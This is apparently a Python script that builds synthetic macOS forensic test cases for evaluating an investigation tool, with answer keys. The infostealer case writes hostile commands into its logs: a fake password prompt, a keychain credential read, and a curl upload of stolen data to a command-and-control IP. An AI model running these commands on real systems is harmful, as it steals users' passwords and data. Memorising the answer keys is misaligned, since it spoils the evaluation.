#!/usr/bin/env python3
"""Generer les cas d'evaluation macOS.

Les artefacts sont synthetiques mais suivent les formats reels : base de
quarantaine QuarantineEventsV2 et TCC.db (schemas SQLite de macOS 11 et
suivants), plists launchd (binaire et XML), export `log show --style
ndjson` et sortie texte par defaut de `log show`, crontab, fichier FSEvents
(pages 2SLD compressees en gzip). La generation est deterministe
(horodatages fixes, gzip sans date, plists tries) : relancer le script
reproduit le contenu a l'identique.

    python eval/build_macos_cases.py            # ecrit dans eval/suite/
    python eval/build_macos_cases.py -o DOSSIER
"""

import argparse
import datetime
import gzip
import json
import os
import plistlib
import sqlite3
import struct
import tempfile

SUITE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'suite')
MAC_EPOCH = 978307200

# Drapeaux FSEvents (valeurs du format sur disque)
IS_DIR, IS_FILE = 0x00000001, 0x00008000
PERM, XATTR_MOD, XATTR_DEL = 0x00010000, 0x00020000, 0x00040000
CREATED, REMOVED, RENAMED, MODIFIED = 0x01000000, 0x02000000, 0x08000000, 0x10000000
INODE_META, FOLDER_CREATED = 0x04000000, 0x80000000

STEALER_DIR = '/Users/alice/Library/Application Support/.helperd'
STEALER_BIN = STEALER_DIR + '/helperd'
STEALER_LABEL = 'com.apple.softwareupdate.helper'
PHISH_ORIGIN = 'https://invoice-viewer-cdn.top/review/7f3a9c'
PHISH_DMG = 'https://invoice-viewer-cdn.top/dl/InvoiceViewer_2026.dmg'
C2 = '194.26.29.112'


def _dt(text):
    return datetime.datetime.strptime(text, '%Y-%m-%dT%H:%M:%SZ').replace(tzinfo=datetime.timezone.utc)


def unix(text):
    return int(_dt(text).timestamp())


def mac_abs(text):
    return float(unix(text) - MAC_EPOCH)


def _write(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb') as f:
        f.write(data if isinstance(data, bytes) else data.encode('utf-8'))


def _truth(case_dir, truth):
    _write(os.path.join(case_dir, 'ground_truth.json'), json.dumps(truth, indent=2, ensure_ascii=False) + '\n')


def _sqlite_bytes(script, rows):
    """Base SQLite construite dans un fichier temporaire, retournee en octets."""
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, 'db.sqlite')
        conn = sqlite3.connect(path)
        conn.execute('PRAGMA page_size=4096')
        conn.execute('PRAGMA journal_mode=DELETE')
        conn.executescript(script)
        for sql, values in rows:
            conn.execute(sql, values)
        conn.commit()
        conn.execute('VACUUM')
        conn.close()
        with open(path, 'rb') as f:
            return f.read()


# ============================================================================
# Constructeurs de formats (reutilises par les tests)
# ============================================================================

TCC_SCHEMA = """
CREATE TABLE admin (key TEXT PRIMARY KEY NOT NULL, value INTEGER NOT NULL);
CREATE TABLE policies (id INTEGER NOT NULL PRIMARY KEY, bundle_id TEXT NOT NULL, uuid TEXT NOT NULL,
    display TEXT NOT NULL, UNIQUE (bundle_id, uuid));
CREATE TABLE access (service TEXT NOT NULL, client TEXT NOT NULL, client_type INTEGER NOT NULL,
    auth_value INTEGER NOT NULL, auth_reason INTEGER NOT NULL, auth_version INTEGER NOT NULL,
    csreq BLOB, policy_id INTEGER, indirect_object_identifier_type INTEGER,
    indirect_object_identifier TEXT NOT NULL DEFAULT 'UNUSED', indirect_object_code_identity BLOB,
    flags INTEGER, last_modified INTEGER NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),
    pid INTEGER, pid_version INTEGER, boot_uuid TEXT NOT NULL DEFAULT 'UNUSED',
    last_reminded INTEGER NOT NULL DEFAULT 0,
    PRIMARY KEY (service, client, client_type, indirect_object_identifier));
INSERT INTO admin VALUES ('version', 25);
"""
CSREQ = bytes.fromhex('fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c'
                      '000000000003')


def tcc_db(entries):
    """entries : (service, client, client_type, auth_value, auth_reason, csreq, last_modified_iso[, indirect])."""
    rows = []
    for e in entries:
        service, client, ctype, value, reason, csreq, when = e[:7]
        indirect = e[7] if len(e) > 7 else 'UNUSED'
        rows.append(('INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version, '
                     'csreq, flags, indirect_object_identifier, last_modified) VALUES (?, ?, ?, ?, ?, 1, ?, 0, ?, ?)',
                     (service, client, ctype, value, reason, csreq, indirect, unix(when))))
    return _sqlite_bytes(TCC_SCHEMA, rows)


QUARANTINE_SCHEMA = """
CREATE TABLE LSQuarantineEvent (LSQuarantineEventIdentifier TEXT PRIMARY KEY NOT NULL,
    LSQuarantineTimeStamp REAL, LSQuarantineAgentBundleIdentifier TEXT, LSQuarantineAgentName TEXT,
    LSQuarantineDataURLString TEXT, LSQuarantineSenderName TEXT, LSQuarantineSenderAddress TEXT,
    LSQuarantineTypeNumber INTEGER, LSQuarantineOriginTitle TEXT, LSQuarantineOriginURLString TEXT,
    LSQuarantineOriginAlias BLOB);
CREATE INDEX LSQuarantineEventIndex ON LSQuarantineEvent (LSQuarantineEventIdentifier);
"""


def quarantine_db(entries):
    """entries : (uuid, when_iso, agent_bundle, agent_name, data_url, type, origin_title, origin_url[, sender])."""
    rows = []
    for e in entries:
        ident, when, bundle, agent, data_url, qtype, title, origin = e[:8]
        sender = e[8] if len(e) > 8 else None
        rows.append(('INSERT INTO LSQuarantineEvent VALUES (?, ?, ?, ?, ?, ?, NULL, ?, ?, ?, NULL)',
                     (ident, mac_abs(when), bundle, agent, data_url, sender, qtype, title, origin)))
    return _sqlite_bytes(QUARANTINE_SCHEMA, rows)


KNOWLEDGEC_SCHEMA = """
CREATE TABLE ZOBJECT (Z_PK INTEGER PRIMARY KEY, Z_ENT INTEGER, ZSTREAMNAME VARCHAR, ZVALUESTRING VARCHAR,
    ZSTARTDATE TIMESTAMP, ZENDDATE TIMESTAMP, ZCREATIONDATE TIMESTAMP, ZSTRUCTUREDMETADATA INTEGER);
CREATE TABLE ZSTRUCTUREDMETADATA (Z_PK INTEGER PRIMARY KEY, Z_ENT INTEGER);
CREATE TABLE ZSOURCE (Z_PK INTEGER PRIMARY KEY, ZBUNDLEID VARCHAR);
"""


def knowledgec_db(entries):
    """entries : (stream, bundle_id, start_iso, end_iso)."""
    rows = [('INSERT INTO ZOBJECT (Z_ENT, ZSTREAMNAME, ZVALUESTRING, ZSTARTDATE, ZENDDATE, ZCREATIONDATE) '
             'VALUES (11, ?, ?, ?, ?, ?)', (s, b, mac_abs(a), mac_abs(z), mac_abs(z))) for s, b, a, z in entries]
    return _sqlite_bytes(KNOWLEDGEC_SCHEMA, rows)


def fsevents_bytes(records, version=2, per_page=64):
    """records : (chemin, id_evenement, drapeaux, inode). Pages DLS compressees en gzip (mtime 0)."""
    magic, tail = {1: (b'1SLD', '<QI'), 2: (b'2SLD', '<QIQ'), 3: (b'3SLD', '<QIQI')}[version]
    out = b''
    for start in range(0, len(records), per_page):
        body = b''
        for path, event_id, flags, inode in records[start:start + per_page]:
            values = (event_id, flags) + ((inode,) if version >= 2 else ()) + ((0,) if version == 3 else ())
            body += path.lstrip('/').encode('utf-8') + b'\x00' + struct.pack(tail, *values)
        out += magic + b'\x00\x00\x00\x00' + struct.pack('<I', 12 + len(body)) + body
    return gzip.compress(out, compresslevel=9, mtime=0)


def launchd_plist(label, argv, binary=True, **keys):
    obj = {'Label': label, 'ProgramArguments': list(argv)}
    obj.update(keys)
    return plistlib.dumps(obj, fmt=plistlib.FMT_BINARY if binary else plistlib.FMT_XML, sort_keys=True)


def ndjson_entry(when_iso, process_path, pid, message, subsystem='', category='', uid=501,
                 sender=None, mtype='Default', etype='logEvent', offset='+0200', frac=0):
    local = _dt(when_iso) + datetime.timedelta(hours=int(offset[:3]), minutes=int(offset[0] + offset[3:]))
    ts = local.strftime('%Y-%m-%d %H:%M:%S') + f'.{frac:06d}' + offset
    return json.dumps({
        'traceID': 0, 'eventMessage': message, 'eventType': etype, 'source': None, 'formatString': message,
        'activityIdentifier': 0, 'subsystem': subsystem, 'category': category, 'threadID': 4000 + pid,
        'senderImageUUID': '00000000-0000-0000-0000-000000000000', 'backtrace': {'frames': []},
        'bootUUID': '4C8E1A0B-2D3F-4A5B-9C6D-7E8F90A1B2C3', 'processImagePath': process_path,
        'timestamp': ts, 'senderImagePath': sender or process_path, 'machTimestamp': 0,
        'messageType': mtype, 'processImageUUID': '00000000-0000-0000-0000-000000000000',
        'processID': pid, 'senderProgramCounter': 0, 'parentActivityIdentifier': 0,
        'timezoneName': '', 'userID': uid}, sort_keys=True)


def text_entry(when_iso, process, pid, message, subsystem=None, category=None, sender=None, mtype='Default',
               thread=0x1a2b, offset='+0200'):
    local = _dt(when_iso) + datetime.timedelta(hours=int(offset[:3]), minutes=int(offset[0] + offset[3:]))
    ts = local.strftime('%Y-%m-%d %H:%M:%S') + '.000000' + offset
    body = f'{process}: '
    if sender:
        body += f'({sender}) '
    if subsystem:
        body += f'[{subsystem}:{category or ""}] '
    return f'{ts} 0x{thread:<8x} {mtype:<11} 0x0                  {pid:<6} 0    {body}{message}'


# ============================================================================
# 1. Voleur d'informations : DMG piege, quarantaine levee, LaunchAgent cache, TCC
# ============================================================================

def build_infostealer(out):
    case = os.path.join(out, 'macos_launchagent_infostealer')
    _write(os.path.join(case, 'com.apple.LaunchServices.QuarantineEventsV2'), quarantine_db([
        ('8F2B6C1E-0A3D-4E5F-9B7A-1C2D3E4F5A6B', '2026-10-09T14:20:05Z', 'com.google.Chrome', 'Google Chrome',
         'https://zoom.us/client/6.2.5/zoomusInstallerFull.pkg', 0, 'Download Center - Zoom',
         'https://zoom.us/download'),
        ('3D9E7A21-5B4C-4F8E-A1D2-6E7F8091A2B3', '2026-10-12T08:41:52Z', 'com.apple.Safari', 'Safari',
         'https://github.com/obsidianmd/obsidian-releases/releases/download/v1.7.4/Obsidian-1.7.4.dmg', 0,
         'Releases - obsidianmd/obsidian-releases', 'https://github.com/obsidianmd/obsidian-releases/releases'),
        ('C47A9E13-2F6B-4D80-B5C1-9A8E7D6C5B4A', '2026-10-14T09:02:11Z', 'com.apple.Safari', 'Safari',
         PHISH_DMG, 0, 'Invoice #4471 - Secure document review', PHISH_ORIGIN),
    ]))
    _write(os.path.join(case, 'TCC_system'), tcc_db([
        ('kTCCServiceSystemPolicyAllFiles', 'com.apple.Terminal', 0, 2, 2, CSREQ, '2026-03-02T10:15:00Z'),
        ('kTCCServiceSystemPolicyAllFiles', '/usr/libexec/sshd-keygen-wrapper', 1, 2, 4, CSREQ,
         '2026-01-20T08:00:00Z'),
        ('kTCCServiceScreenCapture', 'us.zoom.xos', 0, 2, 3, CSREQ, '2026-10-09T14:31:40Z'),
        ('kTCCServiceAccessibility', 'com.microsoft.teams2', 0, 2, 3, CSREQ, '2026-05-11T09:12:00Z'),
        ('kTCCServiceCamera', 'com.example.photobooth', 0, 0, 2, CSREQ, '2026-06-01T12:00:00Z'),
        ('kTCCServiceSystemPolicyAllFiles', STEALER_BIN, 1, 2, 4, None, '2026-10-14T09:06:10Z'),
    ]))
    app = '/Applications/InvoiceViewer.app/Contents/MacOS/InvoiceViewer'
    prompt = ('osascript -e display dialog "To launch the application, you need to update the system settings. '
              'Please enter your password." with title "System Preferences" with icon caution default answer "" '
              'giving up after 150 with hidden answer')
    lines = [
        ndjson_entry('2026-10-14T08:58:02Z', '/System/Library/PrivateFrameworks/SoftwareUpdateCore.framework/'
                     'Versions/A/Resources/softwareupdated', 412, 'Scan finished: 0 products available',
                     'com.apple.SoftwareUpdate', 'SUOSUScan', uid=0),
        ndjson_entry('2026-10-14T08:59:40Z', '/sbin/launchd', 1, 'Service exited with abnormal code: 1',
                     'com.apple.xpc.launchd', 'service', uid=0),
        ndjson_entry('2026-10-14T09:02:11Z', '/Applications/Safari.app/Contents/MacOS/Safari', 1201,
                     'Download finished: InvoiceViewer_2026.dmg', 'com.apple.Safari', 'Downloads'),
        ndjson_entry('2026-10-14T09:03:05Z', '/System/Library/CoreServices/DiskImageMounter.app/Contents/MacOS/'
                     'DiskImageMounter', 1288, 'Attached disk image InvoiceViewer_2026.dmg at /Volumes/InvoiceViewer',
                     'com.apple.DiskImages', 'mount'),
        ndjson_entry('2026-10-14T09:04:30Z', '/usr/bin/sudo', 1302,
                     '   alice : TTY=ttys000 ; PWD=/Users/alice ; USER=root ; COMMAND=/usr/bin/xattr -d -r '
                     'com.apple.quarantine /Applications/InvoiceViewer.app', uid=0),
        ndjson_entry('2026-10-14T09:04:52Z', '/usr/libexec/syspolicyd', 160,
                     'GK evaluateScanResult: 0, PST: (path: /Applications/InvoiceViewer.app), (team: (null)), '
                     '(id: (null)), (bundle_id: (null))', 'com.apple.syspolicy.exec', 'default', uid=0),
        ndjson_entry('2026-10-14T09:05:02Z', '/usr/bin/osascript', 1340, prompt, sender='/usr/bin/osascript'),
        ndjson_entry('2026-10-14T09:05:40Z', '/usr/bin/security', 1352,
                     "security find-generic-password -ga 'Chrome' -s 'Chrome Safe Storage'"),
        ndjson_entry('2026-10-14T09:05:58Z', app, 1331, f'cp helperd to {STEALER_BIN}'),
        ndjson_entry('2026-10-14T09:06:10Z', '/System/Library/PrivateFrameworks/TCC.framework/Support/tccd', 188,
                     f'Update Access Record: kTCCServiceSystemPolicyAllFiles for {STEALER_BIN} to Allowed '
                     '(System Set)', 'com.apple.TCC', 'access', uid=0),
        ndjson_entry('2026-10-14T09:06:30Z', '/bin/launchctl', 1360,
                     f'launchctl load -w /Users/alice/Library/LaunchAgents/{STEALER_LABEL}.plist'),
        ndjson_entry('2026-10-14T09:06:31Z', '/sbin/launchd', 1, f'Service started: gui/501/{STEALER_LABEL}',
                     'com.apple.xpc.launchd', 'service', uid=0),
        ndjson_entry('2026-10-14T09:07:15Z', '/usr/bin/curl', 1377,
                     f'curl -s -X POST -F file=@/private/tmp/.zz/out.zip http://{C2}/joinsystem'),
        ndjson_entry('2026-10-14T09:07:20Z', '/usr/libexec/mdworker_shared', 1390, 'Indexing completed',
                     'com.apple.metadata', 'mdworker'),
        ndjson_entry('2026-10-14T09:10:00Z', '/System/Library/PrivateFrameworks/SoftwareUpdateCore.framework/'
                     'Versions/A/Resources/softwareupdated', 412, 'Scheduling next background scan',
                     'com.apple.SoftwareUpdate', 'SUOSUScheduler', uid=0),
    ]
    _write(os.path.join(case, 'unifiedlog_mbp-alice.ndjson'), '\n'.join(lines) + '\n')
    _write(os.path.join(case, f'LaunchAgents_{STEALER_LABEL}.plist'),
           launchd_plist(STEALER_LABEL, [STEALER_BIN, '--daemon'], RunAtLoad=True, KeepAlive=True))
    _write(os.path.join(case, 'LaunchAgents_com.google.keystone.agent.plist'), launchd_plist(
        'com.google.keystone.agent',
        ['/Users/alice/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/'
         'GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent', '-runMode', 'ifneeded'],
        binary=False, RunAtLoad=True, StartInterval=3523, LimitLoadToSessionType='Aqua'))
    base = 0x4f1a00
    _write(os.path.join(case, '00000000004f1a2b'), fsevents_bytes([
        ('/Users/alice/Library/Caches/com.apple.Safari/Cache.db', base + 1, MODIFIED | IS_FILE, 81231),
        ('/Users/alice/Downloads/InvoiceViewer_2026.dmg', base + 2, CREATED | MODIFIED | XATTR_MOD | IS_FILE, 90112),
        ('/private/var/folders/q1/x7t2/T/TemporaryItems/NSIRD_Safari_1/dl.tmp', base + 3, CREATED | REMOVED | IS_FILE,
         90113),
        ('/Applications/InvoiceViewer.app', base + 4, FOLDER_CREATED | IS_DIR, 90120),
        ('/Applications/InvoiceViewer.app/Contents/MacOS/InvoiceViewer', base + 5, CREATED | MODIFIED | IS_FILE,
         90121),
        ('/Applications/InvoiceViewer.app', base + 6, XATTR_DEL | IS_DIR, 90120),
        (STEALER_DIR, base + 7, FOLDER_CREATED | IS_DIR, 90130),
        (STEALER_BIN, base + 8, CREATED | MODIFIED | PERM | IS_FILE, 90131),
        (f'/Users/alice/Library/LaunchAgents/{STEALER_LABEL}.plist', base + 9, CREATED | MODIFIED | IS_FILE, 90132),
        ('/private/tmp/.zz', base + 10, FOLDER_CREATED | IS_DIR, 90140),
        ('/private/tmp/.zz/Chrome_Login_Data', base + 11, CREATED | MODIFIED | IS_FILE, 90141),
        ('/private/tmp/.zz/login.keychain-db', base + 12, CREATED | MODIFIED | IS_FILE, 90142),
        ('/private/tmp/.zz/out.zip', base + 13, CREATED | MODIFIED | IS_FILE, 90143),
        ('/private/tmp/.zz/Chrome_Login_Data', base + 14, REMOVED | IS_FILE, 90141),
        ('/private/tmp/.zz/login.keychain-db', base + 15, REMOVED | IS_FILE, 90142),
        ('/private/tmp/.zz/out.zip', base + 16, REMOVED | IS_FILE, 90143),
        ('/private/tmp/.zz', base + 17, REMOVED | IS_DIR, 90140),
        ('/Users/alice/Library/Safari/History.db', base + 18, MODIFIED | IS_FILE, 81240),
    ]))
    _truth(case, {
        'description': ("Poste macOS MBP-ALICE : l'utilisatrice alice telecharge InvoiceViewer_2026.dmg depuis "
                        f"{PHISH_ORIGIN} (Safari, base de quarantaine), leve la quarantaine (sudo xattr -d -r "
                        "com.apple.quarantine), une fausse invite osascript vole son mot de passe, le trousseau "
                        f"Chrome est lu, le binaire cache {STEALER_BIN} recoit l'acces complet au disque "
                        "(kTCCServiceSystemPolicyAllFiles, ecriture directe : auth_reason System Set) et persiste "
                        f"par le LaunchAgent {STEALER_LABEL} (RunAtLoad, KeepAlive) ; les donnees sont envoyees a "
                        f"{C2} par curl puis le dossier de travail /private/tmp/.zz est efface."),
        'techniques': ['T1204.002', 'T1553.001', 'T1059.002', 'T1056.002', 'T1555.001', 'T1548.006',
                       'T1543.001', 'T1564.001', 'T1036.005', 'T1041', 'T1070.004'],
        'forbidden_techniques': ['T1543.004', 'T1053.003', 'T1546.014', 'T1486', 'T1110', 'T1037.002'],
        'iocs': ['invoice-viewer-cdn.top', STEALER_BIN, C2],
        'expect_injection': False,
        'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel est le label du LaunchAgent de persistance ?',
             'answer': [STEALER_LABEL], 'related': ['LaunchAgent']},
            {'id': 'Q2', 'question': 'Quel binaire est lance par la persistance ?',
             'answer': [STEALER_BIN, '.helperd/helperd'], 'related': ['helperd']},
            {'id': 'Q3', 'question': "D'ou provient le fichier telecharge ?",
             'answer': [PHISH_ORIGIN, PHISH_DMG, 'invoice-viewer-cdn.top'], 'related': ['quarantine']},
            {'id': 'Q4', 'question': 'Quelle autorisation TCC a ete accordee au binaire ?',
             'answer': ['kTCCServiceSystemPolicyAllFiles', 'Full Disk Access'], 'related': ['TCC']},
        ],
    })


# ============================================================================
# 2. Administration legitime : mises a jour, agents d'editeurs, cron
# ============================================================================

def build_benign(out):
    case = os.path.join(out, 'macos_benign_admin')
    _write(os.path.join(case, 'com.apple.LaunchServices.QuarantineEventsV2'), quarantine_db([
        ('1A2B3C4D-0000-4000-8000-000000000001', '2026-10-13T07:45:10Z', 'com.google.Chrome', 'Google Chrome',
         'https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg', 0, 'Google Chrome',
         'https://www.google.com/chrome/'),
        ('1A2B3C4D-0000-4000-8000-000000000002', '2026-10-13T07:52:33Z', 'com.google.Chrome', 'Google Chrome',
         'https://zoom.us/client/6.2.5/zoomusInstallerFull.pkg', 0, 'Download Center - Zoom',
         'https://zoom.us/download'),
        ('1A2B3C4D-0000-4000-8000-000000000003', '2026-10-13T08:10:02Z', 'com.apple.Safari', 'Safari',
         'https://github.com/git-for-mac/releases/download/2.47.0/git-2.47.0-universal.pkg', 0,
         'Releases', 'https://github.com/git-for-mac/releases'),
    ]))
    _write(os.path.join(case, 'TCC_system'), tcc_db([
        ('kTCCServiceSystemPolicyAllFiles', 'com.apple.Terminal', 0, 2, 2, CSREQ, '2026-02-02T10:00:00Z'),
        ('kTCCServiceSystemPolicyAllFiles', '/usr/libexec/sshd-keygen-wrapper', 1, 2, 4, CSREQ,
         '2026-01-20T08:00:00Z'),
        ('kTCCServiceScreenCapture', 'us.zoom.xos', 0, 2, 3, CSREQ, '2026-10-13T08:01:00Z'),
        ('kTCCServiceMicrophone', 'us.zoom.xos', 0, 2, 2, CSREQ, '2026-10-13T08:01:30Z'),
        ('kTCCServiceCamera', 'us.zoom.xos', 0, 2, 2, CSREQ, '2026-10-13T08:01:31Z'),
        ('kTCCServiceAppleEvents', 'com.microsoft.autoupdate2', 0, 2, 2, CSREQ, '2026-10-13T08:20:00Z',
         'com.microsoft.Word'),
        ('kTCCServiceAccessibility', 'com.jamf.management.Jamf', 0, 2, 6, CSREQ, '2026-04-01T09:00:00Z'),
    ]))
    lines = [
        'Timestamp                       Thread     Type        Activity             PID    TTL  ',
        text_entry('2026-10-13T07:30:00Z', 'softwareupdated', 412, 'Scan finished: 2 products available',
                   'com.apple.SoftwareUpdate', 'SUOSUScan', 'SoftwareUpdateCore'),
        text_entry('2026-10-13T07:31:12Z', 'sudo', 2201, '   admin : TTY=ttys001 ; PWD=/Users/admin ; USER=root ; '
                   'COMMAND=/usr/sbin/softwareupdate -ia --restart'),
        text_entry('2026-10-13T07:31:15Z', 'softwareupdated', 412, 'Installing macOS Sequoia 15.7.1 Update',
                   'com.apple.SoftwareUpdate', 'SUOSUInstall', 'SoftwareUpdateCore'),
        text_entry('2026-10-13T07:40:02Z', 'XProtect', 3101, 'XProtect remediator scan completed: no threats',
                   'com.apple.XProtectFramework', 'remediation'),
        text_entry('2026-10-13T07:52:40Z', 'installer', 3150, 'Installed "Zoom Workplace" (6.2.5)',
                   'com.apple.install', 'install', 'Installer'),
        text_entry('2026-10-13T07:53:01Z', 'launchd', 1, 'Service started: system/us.zoom.ZoomDaemon',
                   'com.apple.xpc.launchd', 'service', 'libxpc.dylib'),
        text_entry('2026-10-13T08:05:00Z', 'sudo', 3302, '   admin : TTY=ttys001 ; PWD=/Users/admin ; USER=root ; '
                   'COMMAND=/usr/bin/xattr -l /Applications/zoom.us.app'),
        text_entry('2026-10-13T08:06:10Z', 'osascript', 3310,
                   'osascript -e display notification "Mises a jour terminees" with title "IT"'),
        text_entry('2026-10-13T08:20:00Z', 'Microsoft AutoUpdate', 3401, 'Checking for updates: 3 apps up to date',
                   'com.microsoft.autoupdate', 'update'),
        text_entry('2026-10-13T08:25:44Z', 'brew', 3502, 'curl -fsSL -o /Users/admin/Library/Caches/Homebrew/'
                   'downloads/git.tar.gz https://ghcr.io/v2/homebrew/core/git/blobs/sha256:4a1b'),
        text_entry('2026-10-13T08:30:00Z', 'tccd', 188, 'Update Access Record: kTCCServiceMicrophone for '
                   '/Applications/zoom.us.app/Contents/MacOS/zoom.us to Allowed (User Consent)',
                   'com.apple.TCC', 'access', 'TCC'),
    ]
    _write(os.path.join(case, 'unifiedlog_admin.log'), '\n'.join(lines) + '\n')
    _write(os.path.join(case, 'System_LaunchDaemons_com.apple.softwareupdated.plist'), launchd_plist(
        'com.apple.softwareupdated',
        ['/System/Library/PrivateFrameworks/SoftwareUpdateCore.framework/Versions/A/Resources/softwareupdated'],
        RunAtLoad=True, KeepAlive=True, UserName='root'))
    _write(os.path.join(case, 'LaunchDaemons_com.microsoft.autoupdate.helper.plist'), launchd_plist(
        'com.microsoft.autoupdate.helper', ['/Library/PrivilegedHelperTools/com.microsoft.autoupdate.helper'],
        binary=False, MachServices={'com.microsoft.autoupdate.helper': True}))
    _write(os.path.join(case, 'LaunchAgents_com.google.keystone.agent.plist'), launchd_plist(
        'com.google.keystone.agent',
        ['/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/'
         'GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent', '-runMode', 'ifneeded'],
        binary=False, RunAtLoad=True, StartInterval=3523, LimitLoadToSessionType='Aqua'))
    _write(os.path.join(case, 'admin.crontab'),
           '# crontab de admin (crontab -l)\nSHELL=/bin/zsh\nMAILTO=""\n'
           '30 3 * * * /opt/homebrew/bin/brew update >/dev/null 2>&1\n'
           '0 9 * * 1 /usr/local/bin/backup-check.sh --quiet\n')
    base = 0x7a0000
    _write(os.path.join(case, '00000000007a0021'), fsevents_bytes([
        ('/Library/Updates/093-12345/InstallAssistant.pkg', base + 1, CREATED | MODIFIED | IS_FILE, 50001),
        ('/private/var/folders/zz/zyxv/T/com.apple.SoftwareUpdate/update.tmp', base + 2, CREATED | REMOVED | IS_FILE,
         50002),
        ('/private/tmp/com.apple.launchd.Kx81QzP', base + 3, CREATED | REMOVED | IS_FILE, 50003),
        ('/Users/admin/Downloads/zoomusInstallerFull.pkg', base + 4, CREATED | MODIFIED | XATTR_MOD | IS_FILE, 50010),
        ('/Applications/zoom.us.app', base + 5, FOLDER_CREATED | XATTR_MOD | IS_DIR, 50011),
        ('/Library/LaunchDaemons/us.zoom.ZoomDaemon.plist', base + 6, CREATED | MODIFIED | IS_FILE, 50012),
        ('/Library/LaunchDaemons/com.microsoft.autoupdate.helper.plist', base + 7, CREATED | MODIFIED | IS_FILE, 50013),
        ('/Users/admin/src/infra/.git/index.lock', base + 8, CREATED | REMOVED | IS_FILE, 50020),
        ('/Users/admin/.Trash/old-installer.dmg', base + 9, REMOVED | IS_FILE, 50021),
        ('/Users/admin/Library/Caches/Homebrew/downloads/git.tar.gz', base + 10, CREATED | REMOVED | IS_FILE, 50030),
        ('/Users/admin/Documents/rapport.docx', base + 11, MODIFIED | INODE_META | IS_FILE, 50040),
    ]))
    _truth(case, {
        'description': ("Administration macOS legitime : mise a jour systeme (softwareupdate), installation de "
                        "Chrome et Zoom depuis les sites des editeurs, agents de mise a jour Google / Microsoft, "
                        "daemon Apple dans /System, autorisations TCC d'applications signees, tache cron brew."),
        'techniques': [],
        'forbidden_techniques': ['T1543.001', 'T1543.004', 'T1053.003', 'T1553.001', 'T1548.006', 'T1059.002',
                                 'T1070.004', 'T1204.002', 'T1036.005', 'T1555.001'],
        'iocs': [],
        'expect_injection': False,
        'benign': True,
    })


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__.split('\n', 1)[0])
    parser.add_argument('-o', '--out', default=SUITE, help='dossier de sortie (defaut eval/suite)')
    args = parser.parse_args(argv)
    build_infostealer(args.out)
    build_benign(args.out)
    print(f'Cas macOS ecrits dans {args.out}')


if __name__ == '__main__':
    main()
